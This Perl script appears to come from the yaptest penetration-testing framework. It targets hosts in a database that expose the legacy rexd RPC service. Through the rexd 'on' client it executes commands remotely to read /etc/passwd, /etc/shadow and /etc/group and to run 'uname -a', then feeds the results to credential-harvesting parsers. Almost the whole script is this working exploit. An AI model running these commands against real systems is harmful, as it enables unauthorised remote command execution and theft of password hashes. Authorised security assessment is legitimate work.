#!/usr/bin/env perl
use strict;
use warnings;
use POSIX;
use yaptest;
use File::Basename;

my $script_name = basename($0);
my $timeout = 10;
my $usage = "Usage: $script_name
Runs rup on IPs in database with the program number '100017' (rexd)
in the output of rpcinfo -p.

NB: on (the rexd client) is required to be in the path.
";

my $y = yaptest->new();
$y->check_exploit_ok();

$y->run_test(
	command => "on -u 1 ::IP:: cat /etc/passwd",
	filter => { port_info => 'rpcinfo_tcp like % 100017 ' },
	inactivity_timeout => $timeout,
	output_file => "rexd-passwd-::IP::.out",
	parser => "yaptest-credentials.pl add --ip ::IP:: -f"
);

$y->run_test(
	command => "on ::IP:: cat /etc/shadow",
	filter => { port_info => 'rpcinfo_tcp like % 100017 ' },
	inactivity_timeout => $timeout,
	output_file => "rexd-shadow-::IP::.out",
	parser => "yaptest-credentials.pl add --ip ::IP:: -f"
);

$y->run_test(
	command => "on ::IP:: cat /etc/group",
	filter => { port_info => 'rpcinfo_tcp like % 100017 ' },
	inactivity_timeout => $timeout,
	output_file => "rexd-group-::IP::.out",
	parser => "yaptest-groups.pl add --group_ip ::IP:: -f"
);

$y->run_test(
	command => "on ::IP:: -- uname -a",
	filter => { port_info => 'rpcinfo_tcp like % 100017 ' },
	inactivity_timeout => $timeout,
	output_file => "rexd-uname-a-::IP::.out"
);

